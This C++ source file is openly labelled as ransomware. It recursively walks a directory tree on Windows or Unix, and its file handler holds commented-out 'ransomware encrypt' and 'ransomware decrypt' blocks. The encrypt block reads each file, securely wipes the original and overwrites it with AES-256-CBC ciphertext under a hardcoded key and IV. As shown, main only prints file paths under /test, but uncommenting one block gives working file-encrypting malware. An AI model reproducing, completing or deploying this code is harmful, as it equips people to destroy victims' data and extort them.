#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#if defined(_WIN32)&&!defined(__CYGWIN__)
	#include <windows.h>
#else
	#include <dirent.h>
	#include <stdlib.h>
#endif

#include "AES256/AES256.hpp"
#include "wipe.cpp"

//Recursively traverse files in path calling handler on each of them...
void traverse_files(const std::string& path,void(*handler)(const std::string&))
{
	#if defined(_WIN32)&&!defined(__CYGWIN__)
		const unsigned int buffer_size=65536;
		char buffer[buffer_size];
		if(GetFullPathName(path.c_str(),buffer_size,buffer,NULL)==0)
			return;
		std::string full_path_name(buffer);
		std::string full_path_wildcard=full_path_name+"\\*.*";
		WIN32_FIND_DATA file_descriptor;
		HANDLE file_handle=FindFirstFile(full_path_wildcard.c_str(),&file_descriptor);
		if(file_handle==INVALID_HANDLE_VALUE)
			return;
		do
		{
			std::string node_name=(file_descriptor.cFileName);
			bool file=(file_descriptor.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)==0;
			bool folder=!file;
			if(node_name!="."&&node_name!="..")
			{
				if(file)
					handler(path+"\\"+node_name);
				else if(folder)
					traverse_files(path+"\\"+node_name,handler);
			}
		}
		while(FindNextFile(file_handle,&file_descriptor));
		FindClose(file_handle);
	#else
		DIR* dp=opendir(path.c_str());
		while(dp!=NULL)
		{
			dirent* np=readdir(dp);
			if(np==NULL)
			{
				closedir(dp);
				break;
			}
			std::string node_name(np->d_name);
			bool file=(np->d_type==DT_REG);
			bool folder=(np->d_type==DT_DIR||np->d_type==DT_LNK);
			if(node_name!="."&&node_name!="..")
			{
				if(file)
					handler(path+"/"+node_name);
				else if(folder)
					traverse_files(path+"/"+node_name,handler);
			}
		}
	#endif
}

//Open a file and save its contents as a string...return true on success and false on error...
bool file_to_string(const std::string& filename,std::string& data)
{
	try
	{
		char buffer;
		std::ios_base::openmode flags=std::ios_base::in|std::ios_base::binary;
		std::ifstream istr(filename.c_str(),flags);
		istr.unsetf(std::ios_base::skipws);
		if(!istr)
			return false;
		data="";
		while(istr>>buffer)
			data+=buffer;
		istr.close();
		return true;
	}
	catch(...)
	{
		return false;
	}
}

//Open a file and save a string as its contents...return true on success and false on error...
bool string_to_file(const std::string& data,const std::string& filename)
{
	try
	{
		bool saved=false;
		std::ios_base::openmode flags=std::ios_base::out|std::ios_base::binary;
		std::ofstream ostr(filename.c_str(),flags);
		saved=(bool)(ostr<<data);
		ostr.close();
		return saved;
	}
	catch(...)
	{
		return false;
	}
}

std::string encrypt(const std::string& key,const std::string& iv,const std::string& plain)
{
	AES256 aes(key,AES256::CBC);
	aes.set_IV(iv);
	return aes.encrypt(plain);
}

std::string decrypt(const std::string& key,const std::string& iv,const std::string& cipher)
{
	AES256 aes(key,AES256::CBC);
	aes.set_IV(iv);
	return aes.decrypt(cipher);
}

//Custom file handler...
void file_handler(const std::string& filepath)
{
	std::cout<<filepath<<std::endl;

	//ransomware encrypt
	/*std::string plain;
	std::string key("01234567890123456789012345678901");
	std::string iv("01234567890123456");
	if(file_to_string(filepath,plain))
	{
		spc_file_wipe(filepath);
		string_to_file(encrypt(key,iv,plain),filepath);
	}*/

	//ransomware decrypt
	/*std::string cipher;
	std::string key("01234567890123456789012345678901");
	std::string iv("01234567890123456");
	if(file_to_string(filepath,cipher))
		string_to_file(decrypt(key,iv,cipher),filepath);*/
}

int main()
{
	traverse_files("/test",file_handler);
	return 0;
}
